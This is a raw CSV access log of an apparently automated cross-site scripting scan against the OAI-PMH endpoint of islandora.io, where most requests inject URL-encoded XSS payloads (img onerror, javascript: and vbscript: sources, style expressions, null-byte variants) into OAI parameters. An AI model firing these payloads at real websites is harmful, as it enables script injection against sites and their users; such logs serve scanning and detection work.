uuid,timestamp,http_status_code,request_url,response_time,http_version
fb6a5a04-0284-43e4-91b3-57ee09654ade,2025-01-28 15:01:50,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Ciframe%3C%3Fphp+echo+chr%2811%29%3F%3E+onload%3Dalert%28%27XSS%27%29%3E%3C%2Fiframe%3E,61.98 ms,HTTP/1.1
96ec1463-9c54-4b50-a608-c71cc4b4dc46,2025-01-28 15:01:51,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,125.51 ms,HTTP/1.1
7cd818bc-ab77-481a-be76-eae2fb606a02,2025-01-28 15:01:51,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Ciframe%3C%3Fphp+echo+chr%2811%29%3F%3E+onload%3Dalert%28%27XSS%27%29%3E%3C%2Fiframe%3E&metadataPrefix=oai_dc,71.11 ms,HTTP/1.1
1e422ba1-938d-4507-8bb2-c66e78d2a8c3,2025-01-28 15:01:51,200,http://islandora.io/oai/request?verb=%3Cimage+src+%3Dq+onerror%3Dprompt%288%29%3E,65.17 ms,HTTP/1.1
05539fab-72e2-446b-b475-df0dbe33df4c,2025-01-28 15:01:52,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cimage+src+%3Dq+onerror%3Dprompt%288%29%3E,51.74 ms,HTTP/1.1
34f9447b-b7b3-4720-b9cc-263e98210540,2025-01-28 15:01:52,200,http://islandora.io/oai/request?verb=ListSets,55.80 ms,HTTP/1.1
c34527da-225a-420d-a507-ee831b3821b7,2025-01-28 15:01:52,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,50.93 ms,HTTP/1.1
454aaadb-17a6-4a78-a215-587f85faec4c,2025-01-28 15:01:53,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cimage+src+%3Dq+onerror%3Dprompt%288%29%3E&until=%3Cimage+src+%3Dq+onerror%3Dprompt%288%29%3E&set=%3Cimage+src+%3Dq+onerror%3Dprompt%288%29%3E,51.17 ms,HTTP/1.1
ff45fdbd-1d6f-414e-b499-bef6477cd296,2025-01-28 15:01:53,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimage+src+%3Dq+onerror%3Dprompt%288%29%3E&metadataPrefix=marc,67.29 ms,HTTP/1.1
21baa084-5413-4132-846a-8fce23f27345,2025-01-28 15:01:54,200,http://islandora.io/oai/request?verb=%3Cimage+src%2Fonerror%3Dprompt%288%29%3E,47.33 ms,HTTP/1.1
19d44ddc-e23f-4897-9d5c-819a11959e6c,2025-01-28 15:01:54,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cimage+src%2Fonerror%3Dprompt%288%29%3E,67.56 ms,HTTP/1.1
c4aac8bb-9be7-4496-afa4-38764f61ed89,2025-01-28 15:01:54,200,http://islandora.io/oai/request?verb=ListSets,42.48 ms,HTTP/1.1
a631cffa-4c25-4f82-a6c8-826dd6c10a03,2025-01-28 15:01:55,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cimage+src%2Fonerror%3Dprompt%288%29%3E,93.96 ms,HTTP/1.1
5514835c-4497-4f80-ab45-900da90e45cc,2025-01-28 15:01:55,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,57.12 ms,HTTP/1.1
4ff900d4-7cb7-4ef4-8a11-d2099cf95c69,2025-01-28 15:01:55,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimage+src%2Fonerror%3Dprompt%288%29%3E&metadataPrefix=marc,60.92 ms,HTTP/1.1
009100cc-5498-4ac8-a3eb-1e3c08410209,2025-01-28 15:01:56,200,http://islandora.io/oai/request?verb=%3Cimage+src%3D%22javascript%3Aalert%281%29%22%3E,45.71 ms,HTTP/1.1
25e02220-7fa5-454b-9849-8f11a8e801b4,2025-01-28 15:01:56,200,http://islandora.io/oai/request?verb=ListMetadataFormats,49.90 ms,HTTP/1.1
014938a1-7c67-47ea-95c1-fac9e41680b3,2025-01-28 15:01:56,200,http://islandora.io/oai/request?verb=ListSets,36.31 ms,HTTP/1.1
04bfece3-6ead-4884-928a-5cc9fc548e22,2025-01-28 15:01:57,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3Cimage+src%3D%22javascript%3Aalert%281%29%22%3E,54.56 ms,HTTP/1.1
653f83ef-13dc-4b89-be8d-6615d4fae581,2025-01-28 15:01:57,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cimage+src%3D%22javascript%3Aalert%281%29%22%3E,95.15 ms,HTTP/1.1
e8d4c2ad-e26b-45da-bb1e-8a2222983c47,2025-01-28 15:01:58,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimage+src%3D%22javascript%3Aalert%281%29%22%3E&metadataPrefix=marc,68.21 ms,HTTP/1.1
be627174-da7e-45e0-901d-035723fc7c93,2025-01-28 15:01:58,200,http://islandora.io/oai/request?verb=%3Cimage+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fimage%3E,55.32 ms,HTTP/1.1
b7ab964d-1c4b-4e34-999c-8c99b7eb88a3,2025-01-28 15:01:58,200,http://islandora.io/oai/request?verb=ListMetadataFormats,53.90 ms,HTTP/1.1
d3062e0e-67ad-4c1e-9199-8dc43986c144,2025-01-28 15:01:59,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cimage+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fimage%3E,68.51 ms,HTTP/1.1
dd5a9b86-a65b-4255-8d6e-06ab61ddcf30,2025-01-28 15:01:59,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,78.63 ms,HTTP/1.1
4b236a83-c17c-4552-90c2-49f65812cc9f,2025-01-28 15:01:59,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cimage+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fimage%3E,112.73 ms,HTTP/1.1
af57585b-5917-4829-9ab8-c3fb15dfa566,2025-01-28 15:02:00,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimage+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fimage%3E&metadataPrefix=oai_dc,37.07 ms,HTTP/1.1
a81e4069-34a1-4e10-b38e-15339367a913,2025-01-28 15:02:00,200,http://islandora.io/oai/request?verb=%3Cimage%2Fsrc%2Fonerror%3Dprompt%288%29%3E,73.27 ms,HTTP/1.1
7c706825-4f8a-4e53-91e3-510c3ce49524,2025-01-28 15:02:01,200,http://islandora.io/oai/request?verb=ListMetadataFormats,29.16 ms,HTTP/1.1
26af08fd-d909-47f6-86cf-e8622c1e1fa7,2025-01-28 15:02:01,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cimage%2Fsrc%2Fonerror%3Dprompt%288%29%3E,63.44 ms,HTTP/1.1
d9fe0482-df35-4915-922b-e242d9dfc461,2025-01-28 15:02:01,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cimage%2Fsrc%2Fonerror%3Dprompt%288%29%3E&set=%3Cimage%2Fsrc%2Fonerror%3Dprompt%288%29%3E,48.65 ms,HTTP/1.1
11d33919-f683-4ed1-b156-3289bb5ecd9b,2025-01-28 15:02:02,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cimage%2Fsrc%2Fonerror%3Dprompt%288%29%3E&set=%3Cimage%2Fsrc%2Fonerror%3Dprompt%288%29%3E,57.40 ms,HTTP/1.1
e1063e95-23a9-433b-bcee-23140ab3c39e,2025-01-28 15:02:02,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimage%2Fsrc%2Fonerror%3Dprompt%288%29%3E&metadataPrefix=marc,58.98 ms,HTTP/1.1
d2c13d94-2ede-48dd-b36a-cc953ff66e80,2025-01-28 15:02:02,200,http://islandora.io/oai/request?verb=%3Cimg+%22%22%22%3E%3Cscript%3Ealert%28%22XSS+by+%5Cnxss%22%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+xss%3C%2Fh1%3E%3C%2Fmarquee%3E,59.03 ms,HTTP/1.1
30065813-897e-4ac1-bf3d-282097d38812,2025-01-28 15:02:03,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cimg+%22%22%22%3E%3Cscript%3Ealert%28%22XSS+by+%5Cnxss%22%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+xss%3C%2Fh1%3E%3C%2Fmarquee%3E,43.64 ms,HTTP/1.1
b4e30732-7b64-4249-9971-6eb14bf28db6,2025-01-28 15:02:03,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cimg+%22%22%22%3E%3Cscript%3Ealert%28%22XSS+by+%5Cnxss%22%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+xss%3C%2Fh1%3E%3C%2Fmarquee%3E,58.06 ms,HTTP/1.1
b84dba9b-d58f-4f16-ab31-2437245964e5,2025-01-28 15:02:03,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cimg+%22%22%22%3E%3Cscript%3Ealert%28%22XSS+by+%5Cnxss%22%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+xss%3C%2Fh1%3E%3C%2Fmarquee%3E&until=%3Cimg+%22%22%22%3E%3Cscript%3Ealert%28%22XSS+by+%5Cnxss%22%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+xss%3C%2Fh1%3E%3C%2Fmarquee%3E,59.77 ms,HTTP/1.1
297f9b2c-971d-4e83-93dc-ed4cfdb96195,2025-01-28 15:02:04,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cimg+%22%22%22%3E%3Cscript%3Ealert%28%22XSS+by+%5Cnxss%22%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+xss%3C%2Fh1%3E%3C%2Fmarquee%3E&until=%3Cimg+%22%22%22%3E%3Cscript%3Ealert%28%22XSS+by+%5Cnxss%22%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+xss%3C%2Fh1%3E%3C%2Fmarquee%3E&set=%3Cimg+%22%22%22%3E%3Cscript%3Ealert%28%22XSS+by+%5Cnxss%22%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+xss%3C%2Fh1%3E%3C%2Fmarquee%3E,74.39 ms,HTTP/1.1
ac1c4da0-2189-4dd1-8e45-a82975189e87,2025-01-28 15:02:04,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimg+%22%22%22%3E%3Cscript%3Ealert%28%22XSS+by+%5Cnxss%22%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+xss%3C%2Fh1%3E%3C%2Fmarquee%3E&metadataPrefix=marc,73.00 ms,HTTP/1.1
0cd5d87d-e53a-4669-92d7-abe971ca05da,2025-01-28 15:02:05,200,http://islandora.io/oai/request?verb=%3Cimg+DYNSRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,67.28 ms,HTTP/1.1
99ff5a6c-c2d9-4386-8f1a-86a6039d7801,2025-01-28 15:02:05,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cimg+DYNSRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,59.02 ms,HTTP/1.1
2247c7da-4514-4ff9-be3b-f991500d7e62,2025-01-28 15:02:05,200,http://islandora.io/oai/request?verb=ListSets,32.02 ms,HTTP/1.1
3845d7a9-9353-4959-a3d2-463f447a0236,2025-01-28 15:02:06,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cimg+DYNSRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&until=%3Cimg+DYNSRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&set=%3Cimg+DYNSRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,68.08 ms,HTTP/1.1
05b3a578-9000-47c4-a585-2b2fc5ed755c,2025-01-28 15:02:06,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cimg+DYNSRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,63.56 ms,HTTP/1.1
d57703a9-27cc-453f-beaf-e7d2faab85a1,2025-01-28 15:02:06,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimg+DYNSRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&metadataPrefix=marc,64.11 ms,HTTP/1.1
66f4c267-9541-4fec-91bd-49b946682fa8,2025-01-28 15:02:07,200,http://islandora.io/oai/request?verb=%3Cimg+LOWSRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,59.86 ms,HTTP/1.1
48fa38b2-9432-489f-9cd9-807cf14dd65b,2025-01-28 15:02:07,200,http://islandora.io/oai/request?verb=ListMetadataFormats,49.21 ms,HTTP/1.1
59928846-d2ff-43d9-aa58-f05820a8083d,2025-01-28 15:02:07,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cimg+LOWSRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,78.22 ms,HTTP/1.1
f6e51062-d93b-4271-b5ec-7d6ab3571879,2025-01-28 15:02:08,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cimg+LOWSRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&until=%3Cimg+LOWSRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,62.35 ms,HTTP/1.1
270675ab-5ceb-4429-b2e6-cb37221f07d7,2025-01-28 15:02:08,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cimg+LOWSRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,114.04 ms,HTTP/1.1
4e709c1f-a4ea-4ac3-a63f-dca69f5b4d9b,2025-01-28 15:02:09,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimg+LOWSRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&metadataPrefix=marc,64.52 ms,HTTP/1.1
25eb2339-c0d7-4b5f-8ad4-a2294af7444f,2025-01-28 15:02:09,200,http://islandora.io/oai/request?verb=%3Cimg+SRC%3D%22+%26%2314%3B+javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,67.98 ms,HTTP/1.1
f6454fff-ec4e-4509-8695-cf1aa7a08991,2025-01-28 15:02:09,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cimg+SRC%3D%22+%26%2314%3B+javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,32.98 ms,HTTP/1.1
d5e74f94-f9b2-4c93-a2ba-4d463c49010a,2025-01-28 15:02:10,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cimg+SRC%3D%22+%26%2314%3B+javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,71.29 ms,HTTP/1.1
77e6b7b1-92d8-4466-bc96-18ba630239dd,2025-01-28 15:02:10,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3Cimg+SRC%3D%22+%26%2314%3B+javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,55.34 ms,HTTP/1.1
e2f89ed8-f96d-4166-92d6-9ee6d2aabfca,2025-01-28 15:02:10,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cimg+SRC%3D%22+%26%2314%3B+javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&set=%3Cimg+SRC%3D%22+%26%2314%3B+javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,58.41 ms,HTTP/1.1
5c21a7b4-e49b-4ca4-bcd4-a36cf8adcc07,2025-01-28 15:02:11,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimg+SRC%3D%22+%26%2314%3B+javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&metadataPrefix=marc,47.84 ms,HTTP/1.1
bf87e1be-3d8d-49ff-b69b-c7b7e7284ae8,2025-01-28 15:02:11,200,http://islandora.io/oai/request?verb=%3Cimg+SRC%3D%22jav+ascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,72.85 ms,HTTP/1.1
df8400dc-7121-41de-8c96-3df258a4d5a4,2025-01-28 15:02:11,200,http://islandora.io/oai/request?verb=ListMetadataFormats,49.47 ms,HTTP/1.1
d5907a74-5708-46c0-887c-deea7a52263a,2025-01-28 15:02:12,200,http://islandora.io/oai/request?verb=ListSets,50.72 ms,HTTP/1.1
b6d13612-cd7e-4efb-aab5-779f79dfe3f4,2025-01-28 15:02:12,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cimg+SRC%3D%22jav+ascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,67.47 ms,HTTP/1.1
88b6ac23-c2a7-4fec-9239-5fc31e7e4054,2025-01-28 15:02:13,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3Cimg+SRC%3D%22jav+ascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&set=%3Cimg+SRC%3D%22jav+ascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,72.50 ms,HTTP/1.1
986d1e24-43a8-4ddc-a839-a5fca790291c,2025-01-28 15:02:13,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimg+SRC%3D%22jav+ascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&metadataPrefix=oai_dc,55.18 ms,HTTP/1.1
7cac66a8-62f8-456b-a3da-b0bb02dba9ad,2025-01-28 15:02:13,200,http://islandora.io/oai/request?verb=%3Cimg+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22,52.20 ms,HTTP/1.1
16c4584c-7100-4162-8f5b-9d67f19f9af9,2025-01-28 15:02:14,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cimg+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22,69.15 ms,HTTP/1.1
8339cb3f-f210-4c5f-90a7-42b02e538d4e,2025-01-28 15:02:14,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cimg+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22,63.06 ms,HTTP/1.1
66deaa53-2261-415f-9eb5-92c9602ed66a,2025-01-28 15:02:14,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3Cimg+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22&set=%3Cimg+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22,58.37 ms,HTTP/1.1
189983bc-533f-4fc1-8f6f-d3da3c352325,2025-01-28 15:02:15,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Cimg+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22&set=%3Cimg+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22,73.74 ms,HTTP/1.1
29dc03ea-1a76-4faf-820d-feaefbb5a6b7,2025-01-28 15:02:15,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimg+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22&metadataPrefix=marc,55.00 ms,HTTP/1.1
faa85967-47c6-4228-ba01-defe3ec5037e,2025-01-28 15:02:15,200,http://islandora.io/oai/request?verb=%3Cimg+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,65.24 ms,HTTP/1.1
cda4e3c2-052c-443f-87b0-f715ffd4f970,2025-01-28 15:02:16,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cimg+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,37.24 ms,HTTP/1.1
7ddcbf13-bc7a-4c63-b063-b00e40a0097e,2025-01-28 15:02:16,200,http://islandora.io/oai/request?verb=ListSets,50.30 ms,HTTP/1.1
c139fbfd-c365-4a17-84d1-84b08d3c02bd,2025-01-28 15:02:17,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,70.46 ms,HTTP/1.1
3bcd8552-cf84-445a-85d1-201ea6791906,2025-01-28 15:02:17,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3Cimg+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&set=%3Cimg+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,70.77 ms,HTTP/1.1
994ff2c5-375d-4322-99c4-7f0a22a5c0ba,2025-01-28 15:02:17,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimg+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&metadataPrefix=marc,69.82 ms,HTTP/1.1
04c38bd0-d53d-4fe1-bed5-e0402fce02d7,2025-01-28 15:02:18,200,http://islandora.io/oai/request?verb=%3Cimg+SRC%3D%27vbscript%3Adocument.vulnerable%3Dtrue%3B%27%3E,69.24 ms,HTTP/1.1
d08e4f58-335c-4772-90fb-78a66b2c6c56,2025-01-28 15:02:18,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cimg+SRC%3D%27vbscript%3Adocument.vulnerable%3Dtrue%3B%27%3E,49.31 ms,HTTP/1.1
ca899b48-b017-49b0-84af-fdc7e0078915,2025-01-28 15:02:18,200,http://islandora.io/oai/request?verb=ListSets,68.25 ms,HTTP/1.1
87f5325e-4923-4147-baa4-260f59f32de8,2025-01-28 15:02:19,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3Cimg+SRC%3D%27vbscript%3Adocument.vulnerable%3Dtrue%3B%27%3E&set=%3Cimg+SRC%3D%27vbscript%3Adocument.vulnerable%3Dtrue%3B%27%3E,58.91 ms,HTTP/1.1
a09f914d-b6d8-49ef-94f9-7376b33df74a,2025-01-28 15:02:19,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cimg+SRC%3D%27vbscript%3Adocument.vulnerable%3Dtrue%3B%27%3E&until=%3Cimg+SRC%3D%27vbscript%3Adocument.vulnerable%3Dtrue%3B%27%3E&set=%3Cimg+SRC%3D%27vbscript%3Adocument.vulnerable%3Dtrue%3B%27%3E,69.62 ms,HTTP/1.1
797f3a98-3233-4d62-9f04-30115713c54e,2025-01-28 15:02:19,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimg+SRC%3D%27vbscript%3Adocument.vulnerable%3Dtrue%3B%27%3E&metadataPrefix=oai_dc,60.84 ms,HTTP/1.1
f80f56c3-f14c-42a2-8ace-939e6356fe44,2025-01-28 15:02:20,200,http://islandora.io/oai/request?verb=%3Cimg+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28document.vulnerable%3Dtrue%29%22%3E,59.80 ms,HTTP/1.1
9210b3d1-93b1-4b41-a8fb-9ac844a01a32,2025-01-28 15:02:20,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cimg+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28document.vulnerable%3Dtrue%29%22%3E,55.39 ms,HTTP/1.1
f4a7af4e-2a51-402d-9ae4-a6452fb829aa,2025-01-28 15:02:21,200,http://islandora.io/oai/request?verb=ListSets,62.08 ms,HTTP/1.1
c9a127bf-f259-436c-a307-040cc7939c92,2025-01-28 15:02:21,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,39.29 ms,HTTP/1.1
73ce7f38-3471-4c1e-afd5-d3b3c747a567,2025-01-28 15:02:21,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cimg+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28document.vulnerable%3Dtrue%29%22%3E&until=%3Cimg+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28document.vulnerable%3Dtrue%29%22%3E,63.27 ms,HTTP/1.1
df901754-92df-4418-8105-d5dedb9a428e,2025-01-28 15:02:22,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimg+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28document.vulnerable%3Dtrue%29%22%3E&metadataPrefix=marc,59.48 ms,HTTP/1.1
5272ef05-ac90-48d2-975f-be3d1f0a774b,2025-01-28 15:02:22,200,http://islandora.io/oai/request?verb=%3Cimg+%5Cx00src%3Dx+onerror%3D%22alert%281%29%22%3E,78.10 ms,HTTP/1.1
14962b09-cfb6-4146-a8fd-88dd8743468b,2025-01-28 15:02:22,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cimg+%5Cx00src%3Dx+onerror%3D%22alert%281%29%22%3E,59.69 ms,HTTP/1.1
1fc3a842-b722-4173-b941-a87c76084476,2025-01-28 15:02:23,200,http://islandora.io/oai/request?verb=ListSets,42.31 ms,HTTP/1.1
1f29f299-9fb3-44e8-9877-6c4f809e347b,2025-01-28 15:02:23,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3Cimg+%5Cx00src%3Dx+onerror%3D%22alert%281%29%22%3E&set=%3Cimg+%5Cx00src%3Dx+onerror%3D%22alert%281%29%22%3E,52.91 ms,HTTP/1.1
d2cdedaf-f45b-4384-b87a-890404d03818,2025-01-28 15:02:23,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cimg+%5Cx00src%3Dx+onerror%3D%22alert%281%29%22%3E&set=%3Cimg+%5Cx00src%3Dx+onerror%3D%22alert%281%29%22%3E,65.63 ms,HTTP/1.1
546f1338-1466-4776-a65c-dc8cc3140d45,2025-01-28 15:02:24,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimg+%5Cx00src%3Dx+onerror%3D%22alert%281%29%22%3E&metadataPrefix=oai_dc,66.92 ms,HTTP/1.1
82ed6aef-e376-4805-bfb7-6e564ad2805a,2025-01-28 15:02:24,200,http://islandora.io/oai/request?verb=%3Cimg+%5Cx00src%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E,56.83 ms,HTTP/1.1
dac99694-18a7-4b4b-8fbc-cb05c271e2e1,2025-01-28 15:02:25,200,http://islandora.io/oai/request?verb=ListMetadataFormats,50.54 ms,HTTP/1.1
abbc5db5-61dd-417c-9a02-ad72f19b0c85,2025-01-28 15:02:25,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cimg+%5Cx00src%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E,59.67 ms,HTTP/1.1
cd116c6e-79fe-4dba-9f62-6cd036ad0188,2025-01-28 15:02:25,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cimg+%5Cx00src%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E,61.39 ms,HTTP/1.1
5b843711-3ff1-48cd-8a00-e579b3604758,2025-01-28 15:02:26,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3Cimg+%5Cx00src%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E,73.00 ms,HTTP/1.1
3436d892-b258-4191-a83d-f2fc2f476540,2025-01-28 15:02:26,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cimg+%5Cx00src%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E&metadataPrefix=marc,59.52 ms,HTTP/1.1
